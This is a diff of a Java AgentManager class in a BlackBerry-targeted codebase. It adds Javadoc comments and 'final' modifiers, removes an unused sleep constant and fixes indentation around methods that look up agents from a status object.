@@ -17,16 +17,14 @@ import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
+// TODO: Auto-generated Javadoc
 /**
  * The Class AgentManager.
  */
 public final class AgentManager extends Manager implements Singleton {
 
-    /** Tempo di attesa tra il check di stop. */
-    private static final int SLEEP_CHECKING_STOP = 400;
-
     /** The debug instance. */
-	//#debug
+    //#debug
     static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);
 
     /** The instance. */
@@ -52,19 +50,29 @@ public final class AgentManager extends Manager implements Singleton {
         super();
     }
 
+    /*
+     * (non-Javadoc)
+     * 
+     * @see blackberry.Manager#getAllItems()
+     */
     public Vector getAllItems() {
         // #ifdef DBC
         Check.requires(statusObj != null, "Null status");
         // #endif
-        Vector agents = statusObj.getAgentsList();
+        final Vector agents = statusObj.getAgentsList();
         return agents;
     }
 
-    public TimerJob getItem(int id) {
+    /*
+     * (non-Javadoc)
+     * 
+     * @see blackberry.Manager#getItem(int)
+     */
+    public TimerJob getItem(final int id) {
         // #ifdef DBC
         Check.requires(statusObj != null, "Null status");
         // #endif
-        Agent agent = statusObj.getAgent(id);
+        final Agent agent = statusObj.getAgent(id);
         // #ifdef DBC
         Check.ensures(agent.agentId == id, "Wrong id");
         // #endif
